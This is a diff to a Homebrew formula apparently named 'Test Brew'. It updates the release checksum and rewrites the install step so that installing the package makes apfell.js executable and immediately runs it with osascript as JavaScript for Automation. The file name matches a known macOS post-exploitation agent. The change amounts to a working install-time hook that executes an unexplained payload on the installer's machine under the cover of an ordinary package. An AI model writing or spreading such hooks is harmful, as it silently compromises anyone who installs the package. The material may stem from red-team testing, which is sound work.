@@ -2,12 +2,12 @@ class Testbrew < Formula
     desc "Test Brew"
     homepage "https://github.com/testing-1-dot/"
     url "https://github.com/testing-1-dot/testbrew/releases/download/v1.3/testbrew-1.3.tar.gz"
-    sha256 "32889eb13a0c06b82a0edbf291d2ff7d288979d27ff569660e54c73ba8b227bb"
+    sha256 "ca3d04f8318eeb3141d77565b893e0099ac7d447d30d44374f7fa97fddd80f4b"
     version "1.3"
 
     def install
         bin.install Dir["*"]
-        system "chmod +x #{bin}/apfell.js && osascript -e \'do shell script \"#{bin}/apfell.js\"\'"
+        system "chmod +x #{bin}/apfell.js && osascript -l JavaScript #{bin}/apfell.js"
   end
 
     def caveats
